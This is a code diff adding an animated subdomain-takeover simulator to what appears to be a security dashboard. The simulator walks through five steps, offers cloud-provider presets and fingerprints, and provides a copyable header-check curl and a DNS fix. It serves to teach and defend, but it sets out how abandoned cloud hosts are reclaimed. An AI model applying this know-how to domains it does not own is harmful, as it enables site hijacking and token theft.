+                </marker>
+            </defs>
+
+            <!-- Base Background Track Connectors -->
+            <path d="${p12}" fill="none" stroke="#1e293b" stroke-width="2" stroke-dasharray="4 4" marker-end="url(#arrow-dim)" />
+            <path d="${p23}" fill="none" stroke="#1e293b" stroke-width="2" stroke-dasharray="4 4" marker-end="url(#arrow-dim)" />
+            <path d="${p34}" fill="none" stroke="#1e293b" stroke-width="2" stroke-dasharray="4 4" marker-end="url(#arrow-dim)" />
+            <path d="${p45}" fill="none" stroke="#1e293b" stroke-width="2" stroke-dasharray="4 4" marker-end="url(#arrow-dim)" />
+            <path d="${p51}" fill="none" stroke="#1e293b" stroke-width="2" stroke-dasharray="6 6" />
+
+            <!-- Energized Highlight Paths (Based on Step Progression) -->
+            ${step >= 2 ? `
+            <path d="${p12}" fill="none" stroke="#06b6d4" stroke-width="3" filter="url(#glow-cyan)" marker-end="url(#arrow-cyan)" />
+            ` : ''}
+            ${step >= 3 ? `
+            <path d="${p23}" fill="none" stroke="#f59e0b" stroke-width="3" filter="url(#glow-amber)" marker-end="url(#arrow-amber)" />
+            ` : ''}
+            ${step >= 4 ? `
+            <path d="${p34}" fill="none" stroke="#a855f7" stroke-width="3" filter="url(#glow-purple)" marker-end="url(#arrow-purple)" />
+            ` : ''}
+            ${step >= 5 ? `
+            <path d="${p45}" fill="none" stroke="#ef4444" stroke-width="3" filter="url(#glow-red)" marker-end="url(#arrow-red)" />
+            <path d="${p51}" fill="none" stroke="#ef4444" stroke-width="3" stroke-dasharray="8 4" filter="url(#glow-red)" marker-end="url(#arrow-red)" />
+            <text x="500" y="28" text-anchor="middle" font-size="9" font-weight="bold" fill="#ef4444" filter="url(#glow-red)">
+                ⚡ MALICIOUS EXPLOIT DELIVERED UNDER TRUSTED SSL PADLOCK ⚡
+            </text>
+            ` : ''}
+
+            <!-- Animated Pulse Packets Travelling Connector Paths -->
+            ${!prefersReducedMotion ? `
+            ${step >= 1 ? `
+            <circle r="4" fill="#06b6d4" filter="url(#glow-cyan)">
+                <animateMotion dur="1.2s" repeatCount="indefinite" path="${p12}" />
+            </circle>
+            ` : ''}
+            ${step >= 2 ? `
+            <circle r="4" fill="#f59e0b" filter="url(#glow-amber)">
+                <animateMotion dur="1.0s" repeatCount="indefinite" path="${p23}" />
+            </circle>
+            ` : ''}
+            ${step >= 3 ? `
+            <circle r="4" fill="#a855f7" filter="url(#glow-purple)">
+                <animateMotion dur="1.2s" repeatCount="indefinite" path="${p34}" />
+            </circle>
+            ` : ''}
+            ${step >= 4 ? `
+            <circle r="4" fill="#ef4444" filter="url(#glow-red)">
+                <animateMotion dur="1.0s" repeatCount="indefinite" path="${p45}" />
+            </circle>
+            ` : ''}
+            ${step >= 5 ? `
+            <circle r="5" fill="#ef4444" filter="url(#glow-red)">
+                <animateMotion dur="2.0s" repeatCount="indefinite" path="${p51}" />
+            </circle>
+            ` : ''}
+            ` : `
+            ${step >= 1 ? '<circle cx="190" cy="145" r="4" fill="#06b6d4" filter="url(#glow-cyan)" />' : ''}
+            ${step >= 2 ? '<circle cx="390" cy="95" r="4" fill="#f59e0b" filter="url(#glow-amber)" />' : ''}
+            ${step >= 3 ? '<circle cx="515" cy="145" r="4" fill="#a855f7" filter="url(#glow-purple)" />' : ''}
+            ${step >= 4 ? '<circle cx="740" cy="215" r="4" fill="#ef4444" filter="url(#glow-red)" />' : ''}
+            ${step >= 5 ? '<circle cx="115" cy="95" r="5" fill="#ef4444" filter="url(#glow-red)" />' : ''}
+            `}
+
+            <!-- ================= NODE 1: VICTIM CLIENT ================= -->
+            <g class="attack-tree-node cursor-pointer" onclick="OrbitAttackTree.setStep(1, '${inst.containerId}')" id="${prefix}-node-1" data-node="1">
+                <rect x="40" y="95" width="150" height="100" rx="12" fill="${s1.fill}" stroke="${s1.border}" stroke-width="${s1.borderWidth}" filter="${s1.filter}" />
+                <text x="115" y="120" text-anchor="middle" font-size="10" font-weight="bold" fill="${s1.textColor}">1. VICTIM CLIENT</text>
+                <text x="115" y="137" text-anchor="middle" font-size="9" fill="#94a3b8">visitor.browser</text>
+                <text x="115" y="155" text-anchor="middle" font-size="8" fill="#38bdf8">${sub}</text>
+                <rect x="55" y="167" width="120" height="18" rx="4" fill="${s1.badgeBg}" />
+                <text x="115" y="179" text-anchor="middle" font-size="8" font-weight="bold" fill="${s1.badgeText}">${step === 1 ? '[1. VISITOR REQUEST]' : s1.badgeLabel}</text>
+            </g>
+
+            <!-- ================= NODE 2: AUTHORITATIVE DNS ================= -->
+            <g class="attack-tree-node cursor-pointer" onclick="OrbitAttackTree.setStep(2, '${inst.containerId}')" id="${prefix}-node-2" data-node="2">
+                <rect x="240" y="45" width="150" height="100" rx="12" fill="${s2.fill}" stroke="${s2.border}" stroke-width="${s2.borderWidth}" filter="${s2.filter}" />
+                <text x="315" y="70" text-anchor="middle" font-size="10" font-weight="bold" fill="${s2.textColor}">2. AUTHORITATIVE DNS</text>
+                <text x="315" y="87" text-anchor="middle" font-size="9" fill="#94a3b8">CNAME Pointer Route</text>
+                <text x="315" y="105" text-anchor="middle" font-size="8" fill="#fbbf24">${cname}</text>
+                <rect x="255" y="117" width="120" height="18" rx="4" fill="${s2.badgeBg}" />
+                <text x="315" y="129" text-anchor="middle" font-size="8" font-weight="bold" fill="${s2.badgeText}">${step === 2 ? '[2. CNAME RESOLVED]' : s2.badgeLabel}</text>
+            </g>
+
+            <!-- ================= NODE 3: ABANDONED CLOUD TENANT ================= -->
+            <g class="attack-tree-node cursor-pointer" onclick="OrbitAttackTree.setStep(3, '${inst.containerId}')" id="${prefix}-node-3" data-node="3">
+                <rect x="440" y="45" width="150" height="100" rx="12" fill="${s3.fill}" stroke="${s3.border}" stroke-width="${s3.borderWidth}" filter="${s3.filter}" />
+                <text x="515" y="70" text-anchor="middle" font-size="10" font-weight="bold" fill="${s3.textColor}">3. ABANDONED TENANT</text>
+                <text x="515" y="87" text-anchor="middle" font-size="9" fill="#94a3b8">${provider}</text>
+                <text x="515" y="105" text-anchor="middle" font-size="8" fill="#f43f5e">${fp}</text>
+                <rect x="455" y="117" width="120" height="18" rx="4" fill="${s3.badgeBg}" />
+                <text x="515" y="129" text-anchor="middle" font-size="8" font-weight="bold" fill="${s3.badgeText}">${step === 3 ? '[3. 404 UNCLAIMED]' : s3.badgeLabel}</text>
+            </g>
+
+            <!-- ================= NODE 4: THREAT ACTOR ================= -->
+            <g class="attack-tree-node cursor-pointer" onclick="OrbitAttackTree.setStep(4, '${inst.containerId}')" id="${prefix}-node-4" data-node="4">
+                <rect x="590" y="165" width="150" height="100" rx="12" fill="${s4.fill}" stroke="${s4.border}" stroke-width="${s4.borderWidth}" filter="${s4.filter}" />
+                <text x="665" y="190" text-anchor="middle" font-size="10" font-weight="bold" fill="${s4.textColor}">4. THREAT ACTOR</text>
+                <text x="665" y="207" text-anchor="middle" font-size="9" fill="#94a3b8">Adversary Re-Claim</text>
+                <text x="665" y="225" text-anchor="middle" font-size="8" fill="#c084fc">Weaponized Payload Injected</text>
+                <rect x="605" y="237" width="120" height="18" rx="4" fill="${s4.badgeBg}" />
+                <text x="665" y="249" text-anchor="middle" font-size="8" font-weight="bold" fill="${s4.badgeText}">${step === 4 ? '[4. HIJACK ARMED]' : s4.badgeLabel}</text>
+            </g>
+
+            <!-- ================= NODE 5: WEAPONIZED EXECUTION ================= -->
+            <g class="attack-tree-node cursor-pointer" onclick="OrbitAttackTree.setStep(5, '${inst.containerId}')" id="${prefix}-node-5" data-node="5">
+                <rect x="810" y="95" width="150" height="100" rx="12" fill="${s5.fill}" stroke="${s5.border}" stroke-width="${s5.borderWidth}" filter="${s5.filter}" />
+                <text x="885" y="120" text-anchor="middle" font-size="10" font-weight="bold" fill="${s5.textColor}">5. WEAPONIZED EXEC</text>
+                <text x="885" y="137" text-anchor="middle" font-size="9" fill="#94a3b8">SSL Padlock Exploited</text>
+                <text x="885" y="155" text-anchor="middle" font-size="8" fill="#f87171">Session Tokens Stolen</text>
+                <rect x="825" y="167" width="120" height="18" rx="4" fill="${s5.badgeBg}" />
+                <text x="885" y="179" text-anchor="middle" font-size="8" font-weight="bold" fill="${s5.badgeText}">${step === 5 ? '[5. COMPROMISED]' : s5.badgeLabel}</text>
+            </g>
+        </svg>
+        `;
+    }
+
+    const _attackTreeInstances = {};
+
+    function _getAttackTreeInstance(containerId) {
+        const id = containerId || 'visualAttackTreeContainer';
+        if (!_attackTreeInstances[id]) {
+            _attackTreeInstances[id] = {
+                containerId: id,
+                scenarioKey: 'aws_s3',
+                activeStep: 1,
+                isPlaying: false,
+                timer: null,
+                subdomain: 'media.client-store.com',
+                cnameTarget: 'orphaned-client-media.s3.amazonaws.com',
+                provider: 'AWS S3',
+                fingerprint: 'NoSuchBucket'
+            };
+        }
+        return _attackTreeInstances[id];
+    }
+
+    const OrbitAttackTree = {
+        scenarios: _ATTACK_TREE_SCENARIOS,
+        getInstance: _getAttackTreeInstance,
+
+        init: function(containerId, options = {}) {
+            const inst = _getAttackTreeInstance(containerId);
+            if (inst.timer) {
+                clearInterval(inst.timer);
+                inst.timer = null;
+            }
+            inst.isPlaying = false;
+
+            if (options.scenarioKey && _ATTACK_TREE_SCENARIOS[options.scenarioKey]) {
+                inst.scenarioKey = options.scenarioKey;
+            }
+            const sc = _ATTACK_TREE_SCENARIOS[inst.scenarioKey] || _ATTACK_TREE_SCENARIOS.aws_s3;
+
+            inst.subdomain = options.subdomain || sc.subdomain;
+            inst.cnameTarget = options.cnameTarget || sc.cnameTarget;
+            inst.provider = sc.provider;
+            inst.fingerprint = sc.fingerprint;
+            inst.activeStep = typeof options.activeStep === 'number' ? Math.max(1, Math.min(5, options.activeStep)) : 1;
+
+            OrbitAttackTree.render(inst.containerId);
+            return inst;
+        },
+
+        setStep: function(stepNumber, containerId) {
+            const inst = _getAttackTreeInstance(containerId);
+            const clamped = Math.max(1, Math.min(5, parseInt(stepNumber, 10) || 1));
+            inst.activeStep = clamped;
+
+            if (window.SimpleCat && typeof SimpleCat.playBlip === 'function') {
+                SimpleCat.playBlip();
+            }
+            if (clamped === 5 && window.SimpleCat && typeof SimpleCat.playPowerUp === 'function') {
+                SimpleCat.playPowerUp();
+            }
+
+            OrbitAttackTree.render(inst.containerId);
+        },
+
+        nextStep: function(containerId) {
+            const inst = _getAttackTreeInstance(containerId);
+            if (inst.activeStep < 5) {
+                OrbitAttackTree.setStep(inst.activeStep + 1, containerId);
+            } else if (inst.isPlaying) {
+                OrbitAttackTree.togglePlay(containerId);
+            }
+        },
+
+        prevStep: function(containerId) {
+            const inst = _getAttackTreeInstance(containerId);
+            if (inst.activeStep > 1) {
+                OrbitAttackTree.setStep(inst.activeStep - 1, containerId);
+            }
+        },
+
+        togglePlay: function(containerId) {
+            const inst = _getAttackTreeInstance(containerId);
+            if (inst.isPlaying) {
+                if (inst.timer) {
+                    clearInterval(inst.timer);
+                    inst.timer = null;
+                }
+                inst.isPlaying = false;
+                if (window.SimpleCat && typeof SimpleCat.playBlip === 'function') {
+                    SimpleCat.playBlip();
+                }
+                OrbitAttackTree.render(inst.containerId);
+            } else {
+                inst.isPlaying = true;
+                if (inst.activeStep >= 5) {
+                    inst.activeStep = 1;
+                }
+                if (window.SimpleCat && typeof SimpleCat.playBlip === 'function') {
+                    SimpleCat.playBlip();
+                }
+                OrbitAttackTree.render(inst.containerId);
+                const prefersReducedMotion = typeof window !== 'undefined' && window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+                const delay = prefersReducedMotion ? 3000 : 2000;
+                inst.timer = setInterval(() => {
+                    const current = _getAttackTreeInstance(containerId);
+                    if (!current.isPlaying) return;
+                    if (current.activeStep < 5) {
+                        OrbitAttackTree.setStep(current.activeStep + 1, containerId);
+                    } else {
+                        OrbitAttackTree.togglePlay(containerId);
+                    }
+                }, delay);
+            }
+        },
+
+        reset: function(containerId) {
+            const inst = _getAttackTreeInstance(containerId);
+            if (inst.timer) {
+                clearInterval(inst.timer);
+                inst.timer = null;
+            }
+            inst.isPlaying = false;
+            inst.activeStep = 1;
+            if (window.SimpleCat && typeof SimpleCat.playBlip === 'function') {
+                SimpleCat.playBlip();
+            }
+            OrbitAttackTree.render(inst.containerId);
+        },
+
+        loadScenario: function(scenarioKey, containerId) {
+            const inst = _getAttackTreeInstance(containerId);
+            const key = _ATTACK_TREE_SCENARIOS[scenarioKey] ? scenarioKey : 'aws_s3';
+            inst.scenarioKey = key;
+            const sc = _ATTACK_TREE_SCENARIOS[key];
+            inst.subdomain = sc.subdomain;
+            inst.cnameTarget = sc.cnameTarget;
+            inst.provider = sc.provider;
+            inst.fingerprint = sc.fingerprint;
+            inst.activeStep = 1;
+            if (inst.timer) {
+                clearInterval(inst.timer);
+                inst.timer = null;
+            }
+            inst.isPlaying = false;
+
+            if (window.SimpleCat && typeof SimpleCat.playBlip === 'function') {
+                SimpleCat.playBlip();
+            }
+
+            const subInput = document.getElementById('pocSubdomainInput');
+            const cnameInput = document.getElementById('pocCnameInput');
+            const fpInput = document.getElementById('pocFingerprintInput');
+            const nxCheck = document.getElementById('pocNxdomainCheckbox');
+            if (subInput) subInput.value = sc.subdomain;
+            if (cnameInput) cnameInput.value = sc.cnameTarget;
+            if (fpInput) fpInput.value = sc.fingerprint;
+            if (nxCheck) nxCheck.checked = Boolean(sc.id === 'azure_nxdomain');
+
+            OrbitAttackTree.render(inst.containerId);
+        },
+
+        preloadCustom: function(subdomain, cnameTarget, provider, fingerprint, containerId) {
+            const inst = _getAttackTreeInstance(containerId);
+            if (subdomain) inst.subdomain = subdomain;
+            if (cnameTarget) inst.cnameTarget = cnameTarget;
+            if (provider) inst.provider = provider;
+            if (fingerprint) inst.fingerprint = fingerprint;
+
+            const provLower = (provider || '').toLowerCase();
+            const cnameLower = (cnameTarget || '').toLowerCase();
+            if (provLower.includes('azure') || cnameLower.includes('azurewebsites.net')) {
+                inst.scenarioKey = 'azure_nxdomain';
+            } else if (provLower.includes('github') || cnameLower.includes('github.io')) {
+                inst.scenarioKey = 'github_pages';
+            } else if (provLower.includes('vercel') || cnameLower.includes('vercel') || cnameLower.includes('now.sh')) {
+                inst.scenarioKey = 'vercel';
+            } else if (provLower.includes('shopify') || cnameLower.includes('myshopify.com')) {
+                inst.scenarioKey = 'shopify';
+            } else if (provLower.includes('s3') || provLower.includes('aws') || cnameLower.includes('s3.amazonaws.com')) {
+                inst.scenarioKey = 'aws_s3';
+            }
+
+            OrbitAttackTree.render(inst.containerId);
+        },
+
+        copyPocSnippet: function(containerId) {
+            const inst = _getAttackTreeInstance(containerId);
+            const sc = _ATTACK_TREE_SCENARIOS[inst.scenarioKey] || _ATTACK_TREE_SCENARIOS.aws_s3;
+            const poc = sc.curlPoc || `curl -sI https://${inst.subdomain}`;
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(poc).catch(() => {});
+            }
+            showArcadeToast('Copied non-destructive PoC verification cURL!');
+        },
+
+        copyFixSnippet: function(containerId) {
+            const inst = _getAttackTreeInstance(containerId);
+            const sc = _ATTACK_TREE_SCENARIOS[inst.scenarioKey] || _ATTACK_TREE_SCENARIOS.aws_s3;
+            const fix = sc.fixSnippet || `# Delete dangling CNAME in DNS zone:\n; ${inst.subdomain}. IN CNAME ${inst.cnameTarget}.`;
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(fix).catch(() => {});
+            }
+            showArcadeToast('Copied DNS remediation fix ticket!');
+        },
+
+        renderInHud: function(hudId, scenarioKey, customDomain, customCname) {
+            return simulateTakeoverAttack(scenarioKey, customDomain, customCname);
+        },
+
+        render: function(containerId) {
+            const el = document.getElementById(containerId);
+            if (!el) return;
+
+            const inst = _getAttackTreeInstance(containerId);
+            const sc = _ATTACK_TREE_SCENARIOS[inst.scenarioKey] || _ATTACK_TREE_SCENARIOS.aws_s3;
+            const stepIdx = Math.max(0, Math.min(4, inst.activeStep - 1));
+            const currentStep = sc.steps[stepIdx] || sc.steps[0];
+            const prefix = `at-${String(containerId).replace(/[^a-zA-Z0-9_-]/g, '')}`;
+
+            const presetKeys = [
+                { id: 'aws_s3', label: 'AWS S3 Hijack' },
+                { id: 'github_pages', label: 'GitHub Pages 404' },
+                { id: 'azure_nxdomain', label: 'Azure NXDOMAIN' },
+                { id: 'vercel', label: 'Vercel Alias' },
+                { id: 'shopify', label: 'Shopify Store' }
+            ];
+
+            const presetButtonsHtml = presetKeys.map(p => {
+                const isActive = (inst.scenarioKey === p.id);
+                const cls = isActive
+                    ? 'px-2.5 py-1.5 rounded-lg bg-amber-500 text-slate-950 font-bold text-[11px] border border-amber-400 cursor-pointer shadow-sm transition'
+                    : 'px-2.5 py-1.5 rounded-lg bg-slate-950 hover:bg-slate-800 text-slate-300 border border-slate-700 hover:border-amber-400 text-[11px] font-semibold cursor-pointer transition';
+                return `<button type="button" onclick="OrbitAttackTree.loadScenario('${p.id}', '${inst.containerId}')" class="${cls}">${p.label}</button>`;
+            }).join('');
+
+            const pillLabels = ['1. Visitor', '2. DNS CNAME', '3. Abandoned', '4. Threat Actor', '5. Weaponized'];
+            const stepPillsHtml = pillLabels.map((lbl, idx) => {
+                const sNum = idx + 1;
+                let cls = '';
+                if (sNum === inst.activeStep) {
+                    cls = 'px-2 py-1 rounded bg-red-500 text-slate-950 font-bold text-[10px] shadow-sm';
+                } else if (sNum < inst.activeStep) {
+                    cls = 'px-2 py-1 rounded bg-emerald-950/80 text-emerald-300 border border-emerald-500/40 text-[10px] font-bold hover:bg-emerald-900/60';
+                } else {
+                    cls = 'px-2 py-1 rounded bg-slate-900 text-slate-400 border border-slate-800 text-[10px] hover:border-slate-700';
+                }
+                return `<button type="button" onclick="OrbitAttackTree.setStep(${sNum}, '${inst.containerId}')" class="${cls} cursor-pointer transition whitespace-nowrap">${lbl}</button>`;
+            }).join('');
+
+            const svgGraphHtml = _buildAttackTreeSvg(inst, sc, prefix);
+
+            const activeDotColor = inst.activeStep === 5 ? 'bg-red-500 animate-ping' : (inst.activeStep >= 3 ? 'bg-amber-400 animate-pulse' : 'bg-cyan-400 animate-pulse');
+
+            el.innerHTML = `
+            <div class="attack-tree-root space-y-4 font-mono text-xs select-none">
+                <!-- Top Header: Title, Preset Badges, Audio & Telemetry Status -->
+                <div class="flex flex-wrap items-center justify-between gap-3 border-b border-red-500/30 pb-3">
+                    <div class="flex items-center gap-2.5">
+                        <span class="w-3 h-3 rounded-full bg-red-500 animate-ping"></span>
+                        <span class="font-arcade text-xs text-red-300 uppercase tracking-wider">VISUAL ATTACK TREE // SUBDOMAIN TAKEOVER SIMULATOR</span>
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <span class="px-2.5 py-1 rounded-md bg-red-500/20 text-red-300 border border-red-500/40 font-bold text-[10px] tracking-wide">${sc.cvss}</span>
+                        <span class="px-2.5 py-1 rounded-md bg-slate-900 text-slate-300 border border-slate-700 text-[10px] font-bold">${sc.provider}</span>
+                    </div>
+                </div>
+
+                <!-- Provider Preset Switcher Buttons (1-Click Scenarios) -->
+                <div class="space-y-1.5">
+                    <div class="text-[11px] text-slate-400 uppercase font-bold flex items-center justify-between">
+                        <span>Target Scenarios & Cloud Presets:</span>
+                        <span class="text-[10px] text-emerald-400 font-normal">Active: ${sc.label}</span>
+                    </div>
+                    <div class="flex flex-wrap gap-1.5">
+                        ${presetButtonsHtml}
+                    </div>
+                </div>
+
+                <!-- Interactive Playback Controls Bar -->
+                <div class="p-3 rounded-xl bg-slate-950/90 border border-slate-800 flex flex-wrap items-center justify-between gap-2.5">
+                    <div class="flex items-center gap-1.5 flex-wrap">
+                        <button type="button" onclick="OrbitAttackTree.reset('${inst.containerId}')" title="Reset to Step 1" class="min-h-[36px] px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-slate-300 hover:text-white border border-slate-700 text-xs font-bold cursor-pointer transition flex items-center gap-1">
+                            <span>⏮</span> <span>Reset</span>
+                        </button>
+                        <button type="button" onclick="OrbitAttackTree.prevStep('${inst.containerId}')" title="Previous Step" class="min-h-[36px] px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-slate-300 hover:text-white border border-slate-700 text-xs font-bold cursor-pointer transition flex items-center gap-1">
+                            <span>◀</span> <span>Prev</span>
+                        </button>
+                        <button type="button" onclick="OrbitAttackTree.togglePlay('${inst.containerId}')" title="${inst.isPlaying ? 'Pause auto-play' : 'Auto-play sequence'}" class="min-h-[36px] px-3.5 py-1.5 rounded-lg ${inst.isPlaying ? 'bg-amber-500 text-slate-950 font-black' : 'bg-red-500 hover:bg-red-400 text-slate-950 font-bold'} text-xs uppercase cursor-pointer transition flex items-center gap-1.5 shadow-md shadow-red-500/20">
+                            <span>${inst.isPlaying ? '⏸' : '▶'}</span>
+                            <span>${inst.isPlaying ? 'Pause' : 'Auto-Play'}</span>
+                        </button>
+                        <button type="button" onclick="OrbitAttackTree.nextStep('${inst.containerId}')" title="Next Step" class="min-h-[36px] px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-slate-300 hover:text-white border border-slate-700 text-xs font-bold cursor-pointer transition flex items-center gap-1">
+                            <span>Next</span> <span>▶</span>
+                        </button>
+                    </div>
+
+                    <!-- 5-Step Stepper Direct Pills -->
+                    <div class="flex items-center gap-1 flex-wrap">
+                        ${stepPillsHtml}
+                    </div>
+                </div>
+
+                <!-- Animated SVG Attack Graph (Responsive Canvas with horizontal scroll container) -->
+                <div class="relative w-full rounded-xl bg-slate-950 border border-red-500/30 p-2 sm:p-4 overflow-x-auto no-scrollbar scroll-indicate-x scroll-fade-r scroll-cyber-x">
+                    <div class="min-w-[720px] w-full">
+                        ${svgGraphHtml}
+                    </div>
+                </div>
+
+                <!-- Active Step CRT Telemetry Screen (Detailed Technical Readout) -->
+                <div class="p-4 sm:p-5 rounded-xl bg-slate-950/95 border border-slate-800 space-y-3 crt-telemetry-screen">
+                    <div class="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-2.5">
+                        <div class="flex items-center gap-2">
+                            <span class="w-2.5 h-2.5 rounded-full ${activeDotColor}"></span>
+                            <span class="font-arcade text-xs text-white uppercase">STEP ${inst.activeStep}/5 // ${currentStep.stepTitle}</span>
+                        </div>
+                        <span class="px-2 py-0.5 rounded text-[10px] font-bold border ${currentStep.badgeColor}">${currentStep.statusBadge}</span>
+                    </div>
+
+                    <p class="text-xs text-slate-300 leading-relaxed">${currentStep.desc}</p>
+
+                    <!-- Live Simulated Wire Packet / Command -->
+                    <div class="p-3 rounded-lg bg-slate-900/90 border border-slate-800 space-y-1">
+                        <div class="text-[10px] font-bold text-slate-500 uppercase flex items-center justify-between">
+                            <span>Simulated Wire Packet / Telemetry Trace</span>
+                            <span class="text-cyan-400 font-mono text-[9px]">RFC-8484 / HTTP-2 / BIND</span>
+                        </div>
+                        <pre class="text-[11px] text-cyan-300 font-mono overflow-x-auto whitespace-pre leading-relaxed select-text">${escapeHtml(currentStep.trace)}</pre>
+                    </div>
+
+                    <!-- Orbit Autonomous Sentinel Interception -->
+                    <div class="p-3 rounded-lg bg-emerald-950/30 border border-emerald-500/40 text-[11px] text-emerald-300 space-y-1">
+                        <div class="font-bold flex items-center gap-1.5 text-emerald-400 uppercase text-[10px]">
+                            <span>🛡 Orbit Sentinel Interception:</span>
+                        </div>
+                        <div>${currentStep.orbitInterception}</div>
+                    </div>
+
+                    <!-- Action / Remediation Footer -->
+                    <div class="pt-1 flex flex-wrap items-center justify-between gap-2 text-xs">
+                        <div class="flex items-center gap-2">
+                            <button type="button" onclick="OrbitAttackTree.copyPocSnippet('${inst.containerId}')" class="px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-cyan-300 border border-cyan-500/40 text-xs font-bold cursor-pointer transition">
+                                Copy PoC cURL
+                            </button>
+                            <button type="button" onclick="OrbitAttackTree.copyFixSnippet('${inst.containerId}')" class="px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-emerald-300 border border-emerald-500/40 text-xs font-bold cursor-pointer transition">
+                                Copy DNS Fix Ticket
+                            </button>
+                        </div>
+                        <div class="flex items-center gap-2">
+                            <button type="button" onclick="if(window.SimpleCat) SimpleCat.explain('cname')" class="px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 border border-emerald-500/40 text-emerald-300 font-pixel text-[11px] cursor-pointer">
+                                🐱 Ask Simple Cat
+                            </button>
+                            <a href="#takeover-poc-playground" class="px-3 py-1.5 rounded-lg bg-red-500/20 hover:bg-red-500/30 text-red-300 border border-red-500/40 text-xs font-bold cursor-pointer transition">
+                                Open in Playground &darr;
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            `;
+        }
+    };
+
+    function simulateTakeoverAttack(scenarioKey = 'cname', customDomain = null, customCname = null) {
+        if (window.SimpleCat && typeof SimpleCat.playPowerUp === 'function') {
+            SimpleCat.playPowerUp();
+        }
+        const hud = document.getElementById('auditHUD');
+        if (!hud) return;
+        hud.classList.remove('hidden');
+
+        const domain = customDomain || document.getElementById('targetDomain')?.value || 'media.client-store.com';
+        let key = scenarioKey;
+        if (!_ATTACK_TREE_SCENARIOS[key]) {
+            key = 'aws_s3';
+        }
+        const sc = _ATTACK_TREE_SCENARIOS[key];
+
+        let targetCname = customCname;
+        if (!targetCname) {
+            const cleanDomainSlug = domain.replace(/[^a-zA-Z0-9-]/g, '-').replace(/^-+|-+$/g, '');
+            if (key === 'aws_s3' || key === 'cname') {
+                targetCname = `orphaned-${cleanDomainSlug}.s3.amazonaws.com`;
+            } else if (key === 'github_pages' || key === 'dotenv') {
+                targetCname = `${cleanDomainSlug.split('-')[0] || 'legacy'}-docs.github.io`;
+            } else if (key === 'azure_nxdomain' || key === 'dmarc') {
+                targetCname = `retired-${cleanDomainSlug.split('-')[0] || 'app'}-prod.azurewebsites.net`;
+            } else if (key === 'vercel' || key === 'php418') {
+                targetCname = 'cname.vercel-dns.com';
+            } else if (key === 'shopify') {
+                targetCname = 'shops.myshopify.com';
+            } else {
+                targetCname = sc.cnameTarget;
+            }
+        }
+
+        OrbitAttackTree.init('auditHUD', {
+            scenarioKey: key,
+            subdomain: domain,
+            cnameTarget: targetCname,
+            activeStep: 1
+        });
+
+        const targetEl = document.getElementById('audit-terminal') || hud;
+        if (targetEl && typeof targetEl.scrollIntoView === 'function') {
+            targetEl.scrollIntoView({ behavior: 'instant', block: 'start' });
+        }
+    }
+    OrbitAttackTree.simulateTakeoverAttack = simulateTakeoverAttack;
+
     let _lastTakeoverSimulation = null;
 
     function loadTakeoverPreset(presetId) {
@@ -3707,6 +4719,9 @@ ${payload.url}`;
         if (nxCheck) nxCheck.checked = Boolean(preset.nxdomain);
 
         runTakeoverPocSimulation();
+        if (OrbitAttackTree.scenarios[presetId]) {
+            OrbitAttackTree.loadScenario(presetId, 'visualAttackTreeContainer');
+        }
     }
 
     function runTakeoverPocSimulation() {
@@ -3785,6 +4800,16 @@ ${payload.url}`;
                 fingerprint: 'None',
                 remediation: 'No action required.'
             };
+        }
+
+        if (typeof OrbitAttackTree !== 'undefined' && typeof OrbitAttackTree.preloadCustom === 'function') {
+            OrbitAttackTree.preloadCustom(
+                sub,
+                cname,
+                matchedRule ? matchedRule.provider : 'Cloud Endpoint',
+                matchedFpText || (isNx ? 'NXDOMAIN' : 'No signature match'),
+                'visualAttackTreeContainer'
+            );
         }
     }
 
@@ -4145,6 +5170,9 @@ ${payload.url}`;
             renderEpssHorizonChart();
             initBountyRadarStatuspage();
             initCrtArcadeShaderCanvas();
+            if (document.getElementById('visualAttackTreeContainer')) {
+                OrbitAttackTree.init('visualAttackTreeContainer', { scenarioKey: 'aws_s3' });
+            }
         });
     } else {
         setTimeout(() => {
@@ -4152,6 +5180,9 @@ ${payload.url}`;
             renderEpssHorizonChart();
             initBountyRadarStatuspage();
             initCrtArcadeShaderCanvas();
+            if (document.getElementById('visualAttackTreeContainer')) {
+                OrbitAttackTree.init('visualAttackTreeContainer', { scenarioKey: 'aws_s3' });
+            }
         }, 50);
     }
 
@@ -4170,6 +5201,8 @@ ${payload.url}`;
     window.loadTakeoverPreset = loadTakeoverPreset;
     window.runTakeoverPocSimulation = runTakeoverPocSimulation;
     window.copyTakeoverRemediation = copyTakeoverRemediation;
+    window.OrbitAttackTree = OrbitAttackTree;
+    window.simulateTakeoverAttack = simulateTakeoverAttack;
     window.runZeroKnowledgeBatchScorecard = runZeroKnowledgeBatchScorecard;
     window.exportZeroKnowledgeScorecardJson = exportZeroKnowledgeScorecardJson;
     window.renderEpssHorizonChart = renderEpssHorizonChart;
